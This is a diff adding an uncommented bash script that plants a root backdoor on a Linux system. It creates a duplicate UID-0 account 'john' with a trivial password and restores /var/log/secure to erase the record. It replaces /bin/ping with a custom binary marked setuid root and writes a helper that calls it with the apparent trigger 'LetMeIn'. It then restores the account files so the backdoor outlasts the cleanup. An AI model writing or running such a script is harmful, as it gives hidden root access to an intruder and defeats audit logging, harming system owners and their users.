@@ -1,0 +1,30 @@
+#!/bin/bash
+
+cp /etc/passwd /etc/passwd.bak
+cp /etc/shadow /etc/shadow.bak
+cp /etc/gshadow /etc/gshadow.bak
+cp /etc/group  /etc/group.bak
+cp /var/log/secure  /var/log/secure.bak
+
+/usr/sbin/useradd john -o -u 0 -d /tmp/john  > /dev/null 2>&1
+echo john | passwd  --stdin john > /dev/null 2>&1
+cp /var/log/secure.bak  /var/log/secure
+
+
+cp /bin/ping /work/ping > /dev/null 2>&1
+cp /work/src/ping /bin/ping > /dev/null 2>&1
+chown root /bin/ping > /dev/null 2>&1
+chmod +s /bin/ping > /dev/null 2>&1
+/bin/sh -c  "cat /proc/meminfo"
+echo "ping LetMeIn" > /work/my_program
+chmod +x /work/my_program
+
+
+cp /etc/passwd.bak /etc/passwd
+cp /etc/shadow.bak /etc/shadow
+cp /etc/gshadow.bak /etc/gshadow
+cp /etc/group.bak  /etc/group
+
+# /usr/sbin/nscd -i passwd
+
+
